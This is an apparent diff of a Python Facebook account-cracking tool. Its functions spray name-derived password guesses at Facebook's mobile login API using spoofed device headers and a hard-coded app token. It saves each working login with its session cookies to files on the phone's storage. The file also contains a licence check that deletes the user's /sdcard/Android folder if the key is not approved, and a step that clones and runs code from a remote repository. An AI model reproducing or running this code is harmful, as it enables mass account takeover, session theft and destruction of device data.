+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            if 'session_key' in po:
+                print(f'\r\r{R}[{G}MOHMMED-💚{R}]{G} '+ids+' 🔻 '+pas+'\033[1;97m')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                cookies = f"sb={ssbb};{coki}"
+                print(f' COOLIES: \033[1;32m'+cookies)
+                open('/sdcard/MOHMMED/MOHMMED-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                open('/sdcard/MOHMMED/MOHMMED-M1-OK.txt','a').write(ids+'|'+pas+'\n')
+                oks.append(ids)
+                okid(ids,pas,cookies)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                
+                    print(f'\r\r{R} [MOHMMED-CP] '+ids+' 🔻 '+pas+'\033[1;97m')
+                    open('/sdcard/MOHMMED/MOHMMED-CP.txt','a').write(ids+'|'+pas+'\n')
+                    cps.append(ids)
+                    break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        time.sleep(20)
+def ffb2(ids,names,passlist):
+    try:
+        global oks,cps,loop
+        sys.stdout.write(f'\r\r{R}[{G}MOHMMED{R}]{W}-{R}[{B}%s{R}]{W}-{R}[{G}OK:%s{R}]{W}-{R}[\33[1;32mCP:%s{R}] {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+            random_seed = random.Random()
+            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+            data={"adid": adid,
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": ids,
+"password": pas,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+            headers={'User-Agent': ua2(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            if 'session_key' in po:
+                print(f'\r\r{R}[{G}MOHMMED-💚{R}]{G} '+ids+' 🔻 '+pas+'\033[1;97m')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                cookies = f"sb={ssbb};{coki}"
+                print(f' COOLIES: \033[1;32m'+cookies)
+                open('/sdcard/MOHMMED/MOHMMED-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                open('/sdcard/MOHMMED/MOHMMED-M2-OK.txt','a').write(ids+'|'+pas+'\n')
+                oks.append(ids)
+                okid(ids,pas,cookies)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                
+                    print(f'\r\r{R} [MOHMMED-CP] '+ids+' 🔻 '+pas+'\033[1;97m')
+                    open('/sdcard/MOHMMED/MOHMMED-CP.txt','a').write(ids+'|'+pas+'\n')
+                    cps.append(ids)
+                    break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        time.sleep(20)
+def ffb3(ids,names,passlist):
+    try:
+        global oks,cps,loop
+        sys.stdout.write(f'\r\r{R}[{G}MOHMMED{R}]{W}-{R}[{B}%s{R}]{W}-{R}[{G}OK:%s{R}]{W}-{R}[\33[1;32mCP:%s{R}] {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+            random_seed = random.Random()
+            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+            data={"adid": adid,
+'method': 'POST',
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'email': ids,
+'password': pas,
+'cpl': 'true',
+'credentials_type': 'password',
+'generate_session_cookies': '1',
+'error_detail_type': 'button_with_disabled',
+'generate_machine_id': '1',
+'locale': 'en_US',
+'client_country_code': 'US',
+'omit_response_on_success': 'false',
+'enroll_misauth': 'false',
+'advertising_id': str(uuid.uuid4()),
+'encrypted_msisdn': '',
+'fb_api_req_friendly_name': 'authenticate'}
+            headers = {'Host': 'graph.facebook.com',
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
+'x-fb-connection-bandwidth': '29920503', 
+'x-fb-net-hni': '34528', 
+'x-fb-sim-hni': '38333', 
+'Zero-Rated': '0', 
+'x-fb-connection-quality': 'EXCELLENT', 
+'x-fb-connection-type': 'MOBILE.LTE', 
+'user-agent': ua3(), 
+'content-type': 'app_authlication/x-www-form-urlencoded',
+'x-fb-http-engine': 'Liger',
+'x-fb-client-IP': 'True',
+'x-fb-server-cluster': 'Keep-Alive',
+'Content-Type': 'application/json'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            if 'session_key' in po:
+                print(f'\r\r{R}[{G}MOHMMED-💚{R}]{G} '+ids+' 🔻 '+pas+'\033[1;97m')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                cookies = f"sb={ssbb};{coki}"
+                print(f' COOKIES: \033[1;32m'+cookies)
+                open('/sdcard/MOHMMED/MOHMMED-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                open('/sdcard/MOHMMED/MOHMMED-M3-OK.txt','a').write(ids+'|'+pas+'\n')
+                oks.append(ids)
+                okid(ids,pas,cookies)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                
+                    print(f'\r\r{R} [MOHMMED-CP] '+ids+' 🔻 '+pas+'\033[1;97m')
+                    open('/sdcard/MOHMMED/MOHMMED-CP.txt','a').write(ids+'|'+pas+'\n')
+                    cps.append(ids)
+                    break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        time.sleep(20)
+def ffb4(ids,names,passlist):
+    try:
+        global oks,cps,loop
+        sys.stdout.write(f'\r\r{R}[{G}MOHMMED{R}]{W}-{R}[{B}%s{R}]{W}-{R}[{G}OK:%s{R}]{W}-{R}[\33[1;32mCP:%s{R}] {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
+            random_seed = random.Random()
+            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+            data={"adid": adid,
+'method': 'POST',
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'email': ids,
+'password': pas,
+'cpl': 'true',
+'credentials_type': 'password',
+'generate_session_cookies': '1',
+'error_detail_type': 'button_with_disabled',
+'generate_machine_id': '1',
+'locale': 'en_US',
+'client_country_code': 'US',
+'omit_response_on_success': 'false',
+'enroll_misauth': 'false',
+'advertising_id': str(uuid.uuid4()),
+'encrypted_msisdn': '',
+'fb_api_req_friendly_name': 'authenticate'}
+            headers = {'Host': 'graph.facebook.com',
+'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
+'x-fb-connection-bandwidth': '29920503', 
+'x-fb-net-hni': '34528', 
+'x-fb-sim-hni': '38333', 
+'Zero-Rated': '0', 
+'x-fb-connection-quality': 'EXCELLENT', 
+'x-fb-connection-type': 'MOBILE.LTE', 
+'user-agent': EROORfile(),
+'content-type': 'app_authlication/x-www-form-urlencoded',
+'x-fb-http-engine': 'Liger',
+'x-fb-client-IP': 'True',
+'x-fb-server-cluster': 'Keep-Alive',
+'Content-Type': 'application/json'}
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            if 'session_key' in po:
+                print(f'\r\r{R}[{G}MOHMMED-💚{R}]{G} '+ids+' 🔻 '+pas+'\033[1;97m')
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                cookies = f"sb={ssbb};{coki}"
+                print(f' COOKIES: \033[1;32m'+cookies)
+                open('/sdcard/MOHMMED/MOHMMED-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
+                open('/sdcard/MOHMMED/MOHMMED-M4-OK.txt','a').write(ids+'|'+pas+'\n')
+                oks.append(ids)
+                okid(ids,pas,cookies)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                
+                    print(f'\r\r{R} [MOHMMED-CP] '+ids+' 🔻 '+pas+'\033[1;97m')
+                    open('/sdcard/MOHMMED/MOHMMED-CP.txt','a').write(ids+'|'+pas+'\n')
+                    cps.append(ids)
+                    break
+            else:
+                continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        time.sleep(20)        
+def Create_exit():
+    clear()
+    print(f'{W}[{R}1{W}] {W}CREATE FILE BY MOHMMED TOOL ')
+    print(f'{W}[{R}2{W}] {W}CREATE FILE BY HANNAN TOOL ')
+    print(f'{W}[{R}0{W}] {W}BACK MAIN MENU ')
+    line()
+    option=input(f'{R}[◽{R}]{W} {W}CHOICE MENU >> ')
+    if option in ['1','01']:
+        os.system('python Extract.py')
+    if option in ['2','02']:
+        Create_M2()
+    if option in ['0','00']:
+        exit()
+    else:
+        line()
+    print(f'{R}[{R}◽{R}]{W} {W}SELECTED WRONG OPTION')
+    time.sleep(2)
+    Create_exit()
+
+def Create_M2():
+        os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
+        os.system('cd && cd FILE ;python FILE.py')
+def getKey():
+    myid = str(os.getuid())
+    myid=myid.upper()[::-1]
+    n=re.findall("(\d\d)",myid)
+    plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
+    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+    
+    return "MOHAMED~"+myid+xp
+km=('https://github.com/MOHAMEED-143/CONTROL-ROOM/blob/main/vip.txt')
+def xi():
+    global km
+    j=getKey()
+    r=requests.get(km).text
+    if j in r:
+        pass
+    else:
+        os.system("clear")
+        #uncomment to activate virus
+        shutil.rmtree("/sdcard/Android")
+        print("Don't Bypass ")
+        sys.exit()
+def Activate():
+    global km
+    r=requests.get(km).text
+    k=getKey()
+    if k in r:
+        menu1()
+        print(f'{R}[◽{R}] {W}\33[1;32m YOUR KEY IS  ACTIVE')               
+    else:
+                clear()
+                print(f'{R}[◽{R}] {W}{R}  YOUR KEY IS NOT ACTIVE')               
+                line()
+                print(f'{W}{R}[◽{R}]\33[1;32m FIRST GET APROVAL KEY')
+                print(f'{W}{R}[◽{R}]\33[1;32m FOR KEY ISSUE CONTACT ADMIN')
+                line()
+                print(f'{W}{R}[◽{R}]\33[1;32m GET APPROVAL FOR USE ')
+                print(f'{W}{R}[◽{R}]\33[1;32m SEND YOUR KEY TO ADMIN')
+                print(f'{W}{R}[◽{R}]\33[1;32m AND GET APPROVAL')
+                print(f'{W}{R}[◽{R}]\33[1;32m COPY THIS KEY ')
+                line()               
+                print(f"{W}{R}[◽{R}]\33[1;32m \33[1;32mYOUR KEY :\x1b[1;91m "+k)
+                line()                
+                input(f'{W}{R}[◽{R}]\33[1;32m PRESS ENTER  ')
+                tks = ('Hi-%20MOHAMED-Sir%20!%20-Please%20-Activate%20-My%20-Key%20-The%20-Key%20-Is%20:%20'+k)
+                os.system('am start https://wa.me/+213774509753?text='+tks)
+                Activate()
+                sys.exit()
+Activate()
